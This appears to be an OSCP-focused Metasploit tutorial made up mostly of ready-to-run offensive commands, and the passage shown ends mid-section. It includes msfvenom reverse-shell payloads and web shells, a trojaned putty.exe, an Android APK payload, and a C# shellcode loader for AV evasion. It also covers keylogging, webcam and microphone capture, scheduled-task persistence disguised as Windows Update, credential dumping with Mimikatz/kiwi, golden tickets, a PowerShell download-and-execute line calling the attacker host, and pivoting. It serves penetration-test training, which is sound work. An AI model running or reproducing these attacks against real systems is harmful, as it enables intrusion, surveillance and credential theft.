
# Metasploit Beyond Basics: Complete Exploitation Framework Mastery

## Table of Contents

1. [Executive Summary & OSCP Relevance](#1-executive-summary--oscp-relevance)
2. [ABSOLUTE BEGINNER: Metasploit Fundamentals](#2-absolute-beginner-metasploit-fundamentals)
3. [Metasploit Architecture Deep Dive](#3-metasploit-architecture-deep-dive)
4. [Payload Types & Selection](#4-payload-types--selection)
5. [Msfvenom Mastery](#5-msfvenom-mastery)
6. [Meterpreter Complete Guide](#6-meterpreter-complete-guide)
7. [Session Management & Persistence](#7-session-management--persistence)
8. [Post-Exploitation Modules](#8-post-exploitation-modules)
9. [Pivoting & Network Routing](#9-pivoting--network-routing)
10. [Database Management](#10-database-management)
11. [Resource Scripts & Automation](#11-resource-scripts--automation)
12. [AV Evasion Techniques](#12-av-evasion-techniques)
13. [Custom Module Development](#13-custom-module-development)
14. [Advanced Meterpreter Extensions](#14-advanced-meterpreter-extensions)
15. [Multi-Handler Strategies](#15-multi-handler-strategies)
16. [Credential Harvesting](#16-credential-harvesting)
17. [OSCP Attack Scenarios](#17-oscp-attack-scenarios)
18. [Common Pitfalls & Troubleshooting](#18-common-pitfalls--troubleshooting)
19. [Best Practices](#19-best-practices)
20. [Hands-on Exercises](#20-hands-on-exercises)
21. [Interview Questions](#21-interview-questions)
22. [Summary & Key Takeaways](#22-summary--key-takeaways)
23. [References & Further Reading](#23-references--further-reading)

---

## 1. Executive Summary & OSCP Relevance

### What is Metasploit Framework?

**Metasploit** is the world's most popular penetration testing framework, providing:
- **20,000+ exploits** and auxiliary modules
- **Multi-platform payload generation** (Windows, Linux, macOS, Android)
- **Post-exploitation framework** (Meterpreter)
- **Database-backed engagement management**
- **Automation and scripting** capabilities

**The Misconception**: "Metasploit is for script kiddies"  
**The Reality**: Professional pentesters use it for exploit development, payload generation, post-exploitation, and network pivoting.

### OSCP Relevance (CRITICAL - 85%)

**OSCP Restrictions**:
- ❌ Only **ONE** Metasploit module allowed per exam
- ✅ Unlimited use of **msfvenom** (payload generation)
- ✅ Unlimited use of **multi/handler** (catching shells)
- ✅ No restrictions on **post-exploitation** modules

**Strategic Usage**:
```
Best Practice:
- Save your ONE module for a critical exploit
- Use msfvenom extensively for payload generation
- Use multi/handler for all reverse shells
- Use post-exploitation modules freely
```

**Common OSCP Patterns**:
1. Generate payloads with msfvenom
2. Use multi/handler to catch shells
3. Upgrade shells to Meterpreter
4. Post-exploitation with built-in modules
5. Save the ONE exploit for a difficult service

**Time Allocation**: 10-15 minutes for setup, ongoing use throughout exam

### Statistics

- **2M+ downloads** monthly
- **20,000+** modules in framework
- **300+** target platforms
- **50+** encoders for evasion
- **Top skill** required in pentesting jobs

---

## 2. ABSOLUTE BEGINNER: Metasploit Fundamentals

### The Framework Analogy

**Think of Metasploit as a Swiss Army Knife**:
```
Regular Hacking:
- Find exploit code online
- Modify for your target
- Compile manually
- Generate shellcode
- Debug connection issues
= Hours of work

With Metasploit:
- Search database
- Select exploit
- Configure options
- Run
= Minutes to compromise
```

### Basic Workflow

```
┌─────────────────────────────────────────────┐
│        Metasploit Attack Workflow           │
└─────────────────────────────────────────────┘

1. Start Metasploit
   msfconsole
   ↓

2. Search for Exploit
   search type:exploit platform:windows smb
   ↓

3. Select Module
   use exploit/windows/smb/ms17_010_eternalblue
   ↓

4. View Options
   show options
   ↓

5. Configure Target
   set RHOSTS 192.168.1.100
   set LHOST 192.168.1.50
   ↓

6. Select Payload
   set PAYLOAD windows/x64/meterpreter/reverse_tcp
   ↓

7. Exploit
   exploit
   ↓

8. Meterpreter Session
   [*] Meterpreter session 1 opened
   meterpreter >
```

### ASCII Visualization

```
┌──────────────────────────────────────────────┐
│     Metasploit Framework Architecture        │
└──────────────────────────────────────────────┘

                msfconsole
                    │
        ┌───────────┴───────────┐
        │                       │
    Exploits              Auxiliary
    (Attack)              (Scan/Fuzz)
        │                       │
        ├─ Windows              ├─ Scanners
        ├─ Linux                ├─ Fuzzers
        ├─ Multi-platform       └─ DoS
        │
    Payloads ─────────┬─────────┐
                      │         │
                  Meterpreter  Shell
                      │
                  ┌───┴───┐
              Reverse  Bind
                  │
            ┌─────┴─────┐
          TCP        HTTPS
```

---

## 3. Metasploit Architecture Deep Dive

### 3.1 Directory Structure

```bash
/usr/share/metasploit-framework/
├── modules/
│   ├── exploits/        # Vulnerability triggers
│   │   ├── windows/
│   │   ├── linux/
│   │   ├── multi/
│   │   └── ...
│   ├── payloads/        # Shellcode
│   │   ├── singles/
│   │   ├── stagers/
│   │   └── stages/
│   ├── auxiliary/       # Scanners, fuzzers
│   ├── post/            # Post-exploitation
│   ├── encoders/        # Obfuscation
│   └── nops/            # No-operation sleds
├── data/                # Templates, wordlists
├── lib/                 # Ruby libraries (core framework)
└── tools/               # msfvenom, pattern_create, etc.
```

### 3.2 Module Types Explained

**A. Exploits** (`modules/exploits/`):
```ruby
# Purpose: Trigger vulnerabilities
# Examples:
- exploit/windows/smb/ms17_010_eternalblue
- exploit/linux/http/apache_mod_cgi_bash_env_exec
- exploit/multi/handler (catches reverse shells)
```

**B. Payloads** (`modules/payloads/`):
```ruby
# Purpose: Code executed after successful exploit
# Types:
- Singles: Standalone (windows/shell_reverse_tcp)
- Stagers: Small loader (windows/meterpreter/reverse_tcp)
- Stages: Full payload (meterpreter, vncinject)
```

**C. Auxiliary** (`modules/auxiliary/`):
```ruby
# Purpose: Scanning, fuzzing, DoS
# Examples:
- auxiliary/scanner/portscan/tcp
- auxiliary/scanner/smb/smb_version
- auxiliary/scanner/http/dir_scanner
```

**D. Post-Exploitation** (`modules/post/`):
```ruby
# Purpose: Actions after compromise
# Examples:
- post/windows/gather/hashdump
- post/linux/gather/enum_system
- post/multi/recon/local_exploit_suggester
```

**E. Encoders** (`modules/encoders/`):
```ruby
# Purpose: Obfuscate payloads (AV evasion)
# Examples:
- x86/shikata_ga_nai
- x64/xor_dynamic
- cmd/powershell_base64
```

### 3.3 Core vs Community Modules

**Core Modules**:
- Maintained by Rapid7
- Thoroughly tested
- Guaranteed to work
- Updated regularly

**Community Modules**:
- Contributed by researchers
- May be outdated
- Require testing
- Located in `~/.msf4/modules/`

---

## 4. Payload Types & Selection

### 4.1 Singles vs Stagers vs Stages

**Singles (Inline Payloads)**:
```
Characteristics:
- Self-contained
- Entire shellcode sent at once
- Larger size (5-10 KB)
- More stable

Naming: windows/shell_reverse_tcp (single slash)

Use When:
- Plenty of buffer space
- Network is unreliable
- Simplicity > stealth
```

**Stagers**:
```
Characteristics:
- Small loader (~300 bytes)
- Downloads full payload (stage)
- Two-phase connection

Naming: windows/meterpreter/reverse_tcp (double slash)
                                ↑ Indicates stager

Use When:
- Limited buffer space (buffer overflow)
- Need flexibility (can send different stages)
```

**Stages**:
```
Characteristics:
- Full-featured payload
- Sent by stager after connection
- Examples: meterpreter, vncinject, shell

Combined: Stager + Stage = Full payload
```

### 4.2 Payload Selection Matrix

| Scenario | Recommended Payload | Reason |
|----------|---------------------|--------|
| **OSCP Exam** | `windows/x64/meterpreter/reverse_tcp` | Reliable, full features |
| **Linux Target** | `linux/x64/meterpreter/reverse_tcp` | Cross-platform compatibility |
| **Stealth** | `windows/x64/meterpreter/reverse_https` | Encrypted C2 channel |
| **Buffer Overflow** | `windows/meterpreter/reverse_tcp` | Small stager fits in limited space |
| **No Network Out** | `windows/meterpreter/bind_tcp` | Target listens, you connect |
| **Firewall Evasion** | `windows/meterpreter/reverse_http` | Port 80 usually allowed |

### 4.3 Understanding Payload Naming

```
Format: [platform]/[architecture]/[payload]/[connection_type]

Examples:

windows/x64/meterpreter/reverse_tcp
  │      │      │           │
  │      │      │           └─ Connection: Reverse TCP
  │      │      └─────────────── Payload: Meterpreter
  │      └────────────────────── Architecture: x64
  └───────────────────────────── Platform: Windows

linux/x86/shell_reverse_tcp
  │     │    │      │
  │     │    │      └─ Connection: Reverse TCP
  │     │    └──────── Payload: Simple shell
  │     └───────────── Architecture: x86 (32-bit)
  └─────────────────── Platform: Linux

cmd/windows/reverse_powershell
 │     │         │
 │     │         └─ Connection: PowerShell reverse
 │     └─────────── OS: Windows
 └───────────────── Type: Command shell
```

---

## 5. Msfvenom Mastery

### 5.1 Basic Msfvenom Usage

**Syntax**:
```bash
msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <output>
```

**Common Examples**:

**Windows EXE (x64)**:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
         LHOST=10.10.14.5 \
         LPORT=4444 \
         -f exe \
         -o shell.exe
```

**Linux ELF**:
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp \
         LHOST=10.10.14.5 \
         LPORT=4444 \
         -f elf \
         -o shell.elf

chmod +x shell.elf
```

**Windows DLL**:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
         LHOST=10.10.14.5 \
         LPORT=4444 \
         -f dll \
         -o malicious.dll
```

**PHP Web Shell**:
```bash
msfvenom -p php/meterpreter/reverse_tcp \
         LHOST=10.10.14.5 \
         LPORT=4444 \
         -f raw \
         -o shell.php
```

**ASP Web Shell**:
```bash
msfvenom -p windows/meterpreter/reverse_tcp \
         LHOST=10.10.14.5 \
         LPORT=4444 \
         -f asp \
         -o shell.asp
```

**JSP Web Shell**:
```bash
msfvenom -p java/meterpreter/reverse_tcp \
         LHOST=10.10.14.5 \
         LPORT=4444 \
         -f war \
         -o shell.war
```

### 5.2 Output Formats

**List All Formats**:
```bash
msfvenom --list formats
```

**Common Formats**:
```
Executable Formats:
  exe       - Windows PE executable
  elf       - Linux executable
  dll       - Windows DLL
  msi       - Windows installer

Script Formats:
  php       - PHP script
  asp       - ASP script
  aspx      - ASPX script
  jsp       - Java Server Page
  war       - Java Web Archive

Shellcode Formats:
  c         - C array
  csharp    - C# array
  python    - Python byte array
  raw       - Raw shellcode
  hex       - Hex string
  base64    - Base64 encoded

Transform Formats:
  psh       - PowerShell script
  psh-cmd   - PowerShell one-liner
```

### 5.3 Encoding & Evasion

**Basic Encoding**:
```bash
msfvenom -p windows/meterpreter/reverse_tcp \
         LHOST=10.10.14.5 \
         LPORT=4444 \
         -e x86/shikata_ga_nai \
         -i 5 \
         -f exe \
         -o encoded.exe

# Flags:
# -e: Encoder to use
# -i: Iterations (5-10 typical)
```

**List Encoders**:
```bash
msfvenom --list encoders
```

**Popular Encoders**:
```
x86/shikata_ga_nai       - Polymorphic XOR (best for x86)
x64/xor_dynamic          - Dynamic XOR (for x64)
cmd/powershell_base64    - PowerShell Base64
```

**Reality Check**:
```
⚠️ WARNING: Basic encoding RARELY bypasses modern AV
- Shikata Ga Nai is well-known
- Signature-based detection catches it
- Better approach: Custom loaders (see section 12)
```

### 5.4 Template Injection

**Inject into Legitimate Binary**:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
         LHOST=10.10.14.5 \
         LPORT=4444 \
         -x /usr/share/windows-binaries/putty.exe \
         -k \
         -f exe \
         -o trojan_putty.exe

# Flags:
# -x: Template executable
# -k: Keep original functionality
```

**How It Works**:
```
1. Opens template binary (putty.exe)
2. Finds code cave (empty space)
3. Injects shellcode
4. Modifies entry point to run shellcode first
5. Restores original execution flow

Result: Putty runs normally + Meterpreter session
```

### 5.5 Advanced Msfvenom Techniques

**A. Bad Characters Removal**:
```bash
# For buffer overflow exploits
msfvenom -p windows/shell_reverse_tcp \
         LHOST=10.10.14.5 \
         LPORT=4444 \
         -b '\x00\x0a\x0d' \
         -f python

# -b: Bad characters to avoid (null byte, newline, carriage return)
```

**B. Variable Names (for scripts)**:
```bash
msfvenom -p windows/meterpreter/reverse_tcp \
         LHOST=10.10.14.5 \
         LPORT=4444 \
         -f python \
         -v shellcode_variable

# Output:
# shellcode_variable = b"\xfc\xe8\x82..."
```

**C. Minimum Size**:
```bash
msfvenom -p windows/meterpreter/reverse_tcp \
         LHOST=10.10.14.5 \
         LPORT=4444 \
         -f exe \
         -o smallest.exe \
         --smallest

# Generates smallest possible payload
```

**D. Platform-Specific Payloads**:
```bash
# List all payloads
msfvenom --list payloads

# Platform-specific
msfvenom --list payloads | grep windows
msfvenom --list payloads | grep linux
msfvenom --list payloads | grep android
```

### 5.6 Multi-Platform Payload Generation

**Python Script**:
```bash
msfvenom -p python/meterpreter/reverse_tcp \
         LHOST=10.10.14.5 \
         LPORT=4444 \
         -f raw \
         -o payload.py
```

**PowerShell One-Liner**:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
         LHOST=10.10.14.5 \
         LPORT=4444 \
         -f psh-cmd

# Output: One-liner for PowerShell execution
```

**Android APK**:
```bash
msfvenom -p android/meterpreter/reverse_tcp \
         LHOST=10.10.14.5 \
         LPORT=4444 \
         -o malicious.apk
```

---

## 6. Meterpreter Complete Guide

### 6.1 What is Meterpreter?

**Meterpreter** = Meta-Interpreter

**Characteristics**:
- Runs entirely in memory (no disk writes)
- DLL injection (runs inside target process)
- Encrypted communication
- Extensible (load modules on-the-fly)
- Cross-platform (Windows, Linux, macOS, Android)

**How It Works**:
```
1. Stager executes on target
2. Stager connects back to attacker
3. Stager downloads Meterpreter DLL
4. DLL injected into memory
5. Reflective DLL injection (no disk I/O)
6. Meterpreter session established
```

### 6.2 Core Meterpreter Commands

**System Commands**:
```bash
sysinfo              # System information
getuid               # Current user
getpid               # Process ID
ps                   # Process list
shell                # Drop to system shell
background           # Background session (Ctrl+Z)
```

**File System**:
```bash
pwd                  # Current directory
ls                   # List files
cd                   # Change directory
cat file.txt         # Read file
download file.txt    # Download to attacker
upload shell.exe     # Upload to target
search -f *.txt      # Search for files
```

**Network**:
```bash
ifconfig             # Network interfaces
route                # Routing table
arp                  # ARP cache
portfwd              # Port forwarding
```

**Process Migration**:
```bash
migrate 1234         # Migrate to PID 1234
run post/windows/manage/migrate   # Auto-migrate
```

**Privilege Escalation**:
```bash
getsystem            # Attempt SYSTEM (UAC bypass)
getprivs             # Show privileges
```

**Credential Harvesting**:
```bash
hashdump             # Dump SAM hashes (requires SYSTEM)
load kiwi            # Load Mimikatz
creds_all            # Dump all credentials
```

### 6.3 Advanced Meterpreter Commands

**Screenshot & Keylogging**:
```bash
screenshot           # Capture screenshot
keyscan_start        # Start keylogger
keyscan_dump         # Dump keystrokes
keyscan_stop         # Stop keylogger
```

**Webcam**:
```bash
webcam_list          # List webcams
webcam_snap          # Take snapshot
webcam_stream        # Stream video
```

**Audio**:
```bash
record_mic           # Record from microphone
```

**Clipboard**:
```bash
clipboard            # Get clipboard contents
```

**Timestomp**:
```bash
timestomp file.exe -v          # View timestamps
timestomp file.exe -m "1/1/2020 12:00:00"  # Modify
```

### 6.4 Meterpreter Scripting

**Auto-Run Scripts**:
```bash
# In msfconsole
set AutoRunScript post/windows/manage/migrate

# Or
set InitialAutoRunScript multi_console_command -rc /root/commands.rc
```

**Commands File** (`commands.rc`):
```ruby
# Auto-execute on session open
sysinfo
getuid
hashdump
run post/windows/gather/checkvm
background
```

---

## 7. Session Management & Persistence

### 7.1 Multi-Session Management

**List Sessions**:
```bash
sessions            # List all sessions
sessions -i 1       # Interact with session 1
sessions -k 2       # Kill session 2
sessions -K         # Kill all sessions
```

**Session Information**:
```bash
sessions -l         # Detailed session list
sessions -v         # Verbose information
```

**Execute Commands Across Sessions**:
```bash
sessions -C "sysinfo"                # Run on all sessions
sessions -C "migrate -N explorer.exe" -i 1,2,3  # Run on specific sessions
```

### 7.2 Shell to Meterpreter Upgrade

**Scenario**: You have a basic shell, want Meterpreter.

**Method 1: From Session**:
```bash
# In msfconsole
sessions -u 1       # Upgrade session 1
```

**Method 2: Manual**:
```bash
use post/multi/manage/shell_to_meterpreter
set SESSION 1
set LHOST 10.10.14.5
run
```

### 7.3 Persistence Mechanisms

**A. Registry Run Key** (Windows):
```bash
# Meterpreter
run persistence -X -i 10 -p 4445 -r 10.10.14.5

# Flags:
# -X: Boot startup
# -i: Connect every 10 seconds
# -p: Port 4445
# -r: Attacker IP
```

**B. Service Installation**:
```bash
# Create malicious service
meterpreter > run metsvc

# Connects back on port 31337 by default
```

**C. Scheduled Task**:
```bash
run scheduleme -m 60 -p payload.exe

# Executes payload.exe every 60 minutes
```

**D. Manual Persistence** (Stealthy):
```bash
# Upload payload
upload /root/backdoor.exe C:\\Windows\\Temp\\update.exe

# Create scheduled task via shell
shell
schtasks /create /tn "Windows Update" /tr "C:\Windows\Temp\update.exe" /sc onlogon /ru SYSTEM
```

### 7.4 Session Recovery

**Auto-Reconnect Handler**:
```ruby
# In resource script
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set LPORT 4444
set ExitOnSession false
set SessionCommunicationTimeout 0
set SessionExpirationTimeout 0
exploit -j -z

# Flags:
# -j: Run as job
# -z: Don't interact (wait for connections)
```

---

## 8. Post-Exploitation Modules

### 8.1 Enumeration Modules

**System Information**:
```bash
run post/windows/gather/enum_system
run post/linux/gather/enum_system
```

**Installed Software**:
```bash
run post/windows/gather/enum_applications
run post/windows/gather/enum_patches
```

**Network Configuration**:
```bash
run post/windows/gather/enum_shares
run post/multi/gather/enum_network
```

**Check VM**:
```bash
run post/windows/gather/checkvm
```

### 8.2 Privilege Escalation

**Local Exploit Suggester**:
```bash
run post/multi/recon/local_exploit_suggester

# Output:
# [+] exploit/windows/local/ms16_075_reflection
# [+] exploit/windows/local/ms16_014_wmi_recv_notif
```

**UAC Bypass**:
```bash
use exploit/windows/local/bypassuac_injection
set SESSION 1
run
```

**Token Manipulation**:
```bash
use incognito
list_tokens -u
impersonate_token "NT AUTHORITY\\SYSTEM"
```

### 8.3 Credential Harvesting

**Hash Dump**:
```bash
run post/windows/gather/hashdump
run post/windows/gather/smart_hashdump
```

**Mimikatz (Kiwi)**:
```bash
load kiwi
creds_all               # All credentials
creds_kerberos          # Kerberos tickets
creds_msv               # NTLM hashes
creds_ssp               # SSP credentials
creds_tspkg             # TsPkg credentials
creds_wdigest           # WDigest passwords
```

**Browser Credentials**:
```bash
run post/multi/gather/firefox_creds
run post/windows/gather/enum_chrome
```

**Wi-Fi Passwords**:
```bash
run post/windows/gather/enum_wifi
```

### 8.4 Data Exfiltration

**Search & Download**:
```bash
# Search for files
search -f *.docx
search -f *password*
search -f *.kdbx  # KeePass databases

# Download
download C:\\Users\\Admin\\Desktop\\passwords.txt
```

**Automated Collection**:
```bash
run post/windows/gather/dumplinks
run post/windows/gather/enum_files
```

---

## 9. Pivoting & Network Routing

### 9.1 Understanding Pivoting

**Scenario**:
```
Internet ← → DMZ Host ← → Internal Network
  (You)      (Compromised)    (Target)
  
Goal: Use compromised DMZ host to attack internal network
```

### 9.2 AutoRoute

**Add Route**:
```bash
# Meterpreter session on DMZ host
run autoroute -s 10.10.10.0/24

# Verify
run autoroute -p
```

**Manual Route**:
```bash
# From msfconsole
route add 10.10.10.0 255.255.255.0 1
# Subnet, netmask, session ID

# List routes
route print

# Delete route
route delete 10.10.10.0 255.255.255.0 1
```

### 9.3 SOCKS Proxy

**Setup**:
```bash
# From msfconsole
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
set VERSION 4a
run -j

# Verify
jobs
```

**Configure ProxyChains**:
```bash
# Edit /etc/proxychains4.conf
sudo nano /etc/proxychains4.conf

# Add at end:
socks4 127.0.0.1 1080
```

**Use with Tools**:
```bash
# Nmap through proxy
proxychains nmap -sT -Pn 10.10.10.5

# SSH through proxy
proxychains ssh user@10.10.10.5

# Browser through proxy
proxychains firefox
```

### 9.4 Port Forwarding

**Local Port Forward**:
```bash
# Forward local port 3389 to target's 3389
portfwd add -l 3389 -p 3389 -r 10.10.10.5

# Connect locally
rdesktop 127.0.0.1
xfreerdp /v:127.0.0.1 /u:Administrator
```

**List Forwards**:
```bash
portfwd list
```

**Delete Forward**:
```bash
portfwd delete -l 3389
```

**Reverse Port Forward**:
```bash
# Target connects back to you
portfwd add -R -l 4444 -p 4444 -L 10.10.14.5
```

---

## 10. Database Management

### 10.1 Database Setup

**Initialize Database**:
```bash
# First time setup
sudo msfdb init

# Start database
sudo systemctl start postgresql
sudo msfdb start

# Check status
sudo msfdb status
```

**Connect in msfconsole**:
```bash
msfconsole
db_status
# Output: [*] Connected to msf
```

### 10.2 Workspace Management

**Create Workspace**:
```bash
workspace -a client_pentest_2024
```

**List Workspaces**:
```bash
workspace
# Output:
#   default
# * client_pentest_2024  (current)
```

**Switch Workspace**:
```bash
workspace default
```

**Delete Workspace**:
```bash
workspace -d old_project
```

### 10.3 Importing Scan Data

**Nmap XML**:
```bash
# From nmap
nmap -sV -oX scan.xml 192.168.1.0/24

# Import to Metasploit
db_import scan.xml
```

**Nessus**:
```bash
db_import nessus_scan.nessus
```

**Nexpose**:
```bash
db_import nexpose_scan.xml
```

### 10.4 Database Queries

**Hosts**:
```bash
hosts                           # All hosts
hosts -c address,os_name        # Specific columns
hosts 192.168.1.100             # Specific host
hosts -S Linux                  # Search by OS
```

**Services**:
```bash
services                        # All services
services -p 445                 # SMB services
services -p 80,443              # Web services
services -S http                # Search by name
services --up                   # Only running services
```

**Vulnerabilities**:
```bash
vulns                           # All vulnerabilities
vulns -p 445                    # SMB vulns
```

**Credentials**:
```bash
creds                           # All credentials
creds -t password               # Passwords only
creds -t hash                   # Hashes only
```

**Notes**:
```bash
notes                           # All notes
notes -t host.info              # Specific type
```

### 10.5 Database-Driven Attacks

**Auto-Exploit**:
```bash
# Exploit all vulnerable services
db_autopwn -t -p -e

# Flags:
# -t: Target all hosts
# -p: Run plugins
# -e: Exploit
```

**Targeted Scanning**:
```bash
# Scan specific service from database
services -p 445 --rhosts | use auxiliary/scanner/smb/smb_version
```

---

## 11. Resource Scripts & Automation

### 11.1 What are Resource Scripts?

**Resource Scripts** (.rc files) = Batch commands for msfconsole

**Use Cases**:
- Automate listener setup
- Run multiple exploits
- Configure environments
- Post-exploitation automation

### 11.2 Basic Resource Script

**File**: `handler.rc`
```ruby
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set LPORT 4444
set ExitOnSession false
exploit -j -z
```

**Execute**:
```bash
msfconsole -r handler.rc
```

### 11.3 Advanced Resource Scripts

**Multi-Handler Setup**:
```ruby
# File: multi_handler.rc
<ruby>
[
  {payload: 'windows/meterpreter/reverse_tcp', lport: 4444},
  {payload: 'linux/x64/meterpreter/reverse_tcp', lport: 4445},
  {payload: 'php/meterpreter/reverse_tcp', lport: 4446}
].each do |config|
  run_single("use exploit/multi/handler")
  run_single("set PAYLOAD #{config[:payload]}")
  run_single("set LHOST 10.10.14.5")
  run_single("set LPORT #{config[:lport]}")
  run_single("set ExitOnSession false")
  run_single("exploit -j -z")
end
</ruby>
```

**Auto-Exploit Script**:
```ruby
# File: auto_exploit.rc
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS file:/root/targets.txt
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set LPORT 4444
run -j
```

### 11.4 On-Session Resource Scripts

**Auto-Run on New Session**:
```ruby
# File: post_exploit.rc
sysinfo
getuid
run post/windows/gather/checkvm
run post/windows/gather/enum_applications
hashdump
screenshot
background
```

**Configure in Handler**:
```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set LPORT 4444
set AutoRunScript multi_console_command -rc /root/post_exploit.rc
exploit
```

### 11.5 Dynamic Resource Scripts

**Ruby Integration**:
```ruby
# File: smart_exploit.rc
<ruby>
framework.db.hosts.each do |host|
  if host.os_name =~ /Windows/
    print_status("Targeting Windows host: #{host.address}")
    run_single("use exploit/windows/smb/ms17_010_eternalblue")
    run_single("set RHOSTS #{host.address}")
    run_single("set PAYLOAD windows/x64/meterpreter/reverse_tcp")
    run_single("set LHOST 10.10.14.5")
    run_single("run -j")
  end
end
</ruby>
```

---

## 12. AV Evasion Techniques

### 12.1 Why Encoders Don't Work Anymore

**The Problem**:
```
Traditional Evasion:
msfvenom ... -e x86/shikata_ga_nai -i 10

Modern AV:
- Signature detection: ✅ Catches shikata_ga_nai
- Heuristic analysis: ✅ Recognizes encoding patterns
- Behavioral detection: ✅ Monitors suspicious actions
- Cloud analysis: ✅ Reputation-based blocking

Result: Encoded payloads caught instantly
```

### 12.2 Effective Evasion Strategies

**A. Encrypted Payload Delivery**:
```bash
# Use HTTPS handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST 10.10.14.5
set LPORT 443
set EnableStageEncoding true
set StageEncoder x64/xor_dynamic
```

**B. Custom Loaders** (Most Effective):

**C# Loader Example**:
```csharp
using System;
using System.Runtime.InteropServices;

class Loader {
    [DllImport("kernel32")]
    static extern IntPtr VirtualAlloc(IntPtr addr, uint size, uint type, uint protect);
    
    [DllImport("kernel32")]
    static extern IntPtr CreateThread(IntPtr attrs, uint stack, IntPtr start, IntPtr param, uint flags, IntPtr id);
    
    static void Main() {
        // Shellcode generated with: msfvenom -p windows/x64/meterpreter/reverse_tcp -f csharp
        byte[] buf = new byte[511] {0xfc,0x48,0x83,0xe4, /* ... */ };
        
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
        Marshal.Copy(buf, 0, addr, buf.Length);
        CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        System.Threading.Thread.Sleep(10000);
    }
}
```

**Compile**:
```bash
# On Windows
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:loader.exe loader.cs

# Or use cross-compiler
mcs loader.cs -out:loader.exe
```

**C. Process Injection**:
```csharp
// Inject into legitimate process
// More complex, better evasion
```

### 12.3 Meterpreter Evasion

**Stageless Payload**:
```bash
# Entire Meterpreter in one payload (no second-stage download)
msfvenom -p windows/x64/meterpreter_reverse_tcp \
         LHOST=10.10.14.5 \
         LPORT=4444 \
         -f exe \
         -o stageless.exe
```

**Migrate Immediately**:
```bash
# In AutoRunScript
set AutoRunScript post/windows/manage/migrate

# Or manually
migrate -N explorer.exe
```

**Use HTTPS**:
```bash
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST 10.10.14.5
set LPORT 443
```

### 12.4 Shellter (Binary Backdooring)

**Install**:
```bash
sudo apt install shellter
```

**Usage**:
```bash
# Interactive
shellter

# Steps:
# 1. Select PE target (e.g., putty.exe)
# 2. Choose Auto mode
# 3. Select custom payload
# 4. Provide msfvenom shellcode
# 5. Wait for injection
```

---

## 13. Custom Module Development

### 13.1 Module Structure

**Basic Exploit Module**:
```ruby
# File: ~/.msf4/modules/exploits/custom/my_exploit.rb

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'My Custom Exploit',
      'Description'    => %q{
        This exploits a vulnerability in...
      },
      'Author'         => ['Your Name'],
      'License'        => MSF_LICENSE,
      'Platform'       => 'win',
      'Targets'        =>
        [
          ['Windows 10', { 'Ret' => 0x1337beef }]
        ],
      'DefaultTarget'  => 0
    ))

    register_options(
      [
        Opt::RPORT(80)
      ])
  end

  def exploit
    connect
    # Exploitation code here
    print_status("Sending exploit...")
    handler
    disconnect
  end
end
```

**Reload Module**:
```bash
# In msfconsole
reload_all
```

### 13.2 Auxiliary Module Example

**Scanner Module**:
```ruby
require 'msf/core'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'My Custom Scanner',
      'Description' => 'Scans for...',
      'Author'      => ['Your Name'],
      'License'     => MSF_LICENSE
    ))

    register_options([
      Opt::RPORT(8080)
    ])
  end

  def run_host(ip)
    begin
      connect
      sock.puts("GET / HTTP/1.1\r\n\r\n")
      response = sock.get_once
      
      if response =~ /vulnerable_string/
        print_good("#{ip}:#{rport} - VULNERABLE!")
      end
    rescue ::Exception => e
      print_error("#{ip}:#{rport} - Error: #{e.message}")
    ensure
      disconnect
    end
  end
end
```

---

## 14. Advanced Meterpreter Extensions

### 14.1 Kiwi (Mimikatz)

**Load Extension**:
```bash
load kiwi
help kiwi
```

**Commands**:
```bash
# Dump all credentials
creds_all

# Specific credential types
creds_kerberos
creds_msv
creds_ssp
creds_livessp
creds_tspkg
creds_wdigest

# LSA secrets
lsa_dump_secrets

# SAM database
lsa_dump_sam

# Advanced
kiwi_cmd "sekurlsa::logonpasswords"
kiwi_cmd "lsadump::sam"
```

**Golden Ticket**:
```bash
golden_ticket_create -u Administrator -d domain.local -s SID -k krbtgt_hash -t /root/ticket.kirbi
```

### 14.2 Incognito (Token Impersonation)

**Load Extension**:
```bash
load incognito
```

**List Tokens**:
```bash
list_tokens -u    # User tokens
list_tokens -g    # Group tokens
```

**Impersonate**:
```bash
impersonate_token "NT AUTHORITY\\SYSTEM"
impersonate_token "DOMAIN\\Administrator"
```

**Add User to Group**:
```bash
add_user hacker Password123! -h 10.10.10.5
add_group_user "Domain Admins" hacker -h 10.10.10.5
```

### 14.3 PowerShell Extension

**Load**:
```bash
load powershell
```

**Import Script**:
```bash
powershell_import /root/PowerView.ps1
powershell_import /root/Invoke-Mimikatz.ps1
```

**Execute**:
```bash
powershell_execute "Get-NetDomain"
powershell_execute "Invoke-Mimikatz"
```

**One-Liner**:
```bash
powershell_shell "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')"
```

---

## 15. Multi-Handler Strategies

### 15.1 Persistent Handler

**Setup**:
```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
exploit -j -z

# Flags:
# -j: Run as job (background)
# -z: Don't interact with session
# ExitOnSession false: Keep handler running after connection
```

**Why This Matters**:
```
Without ExitOnSession false:
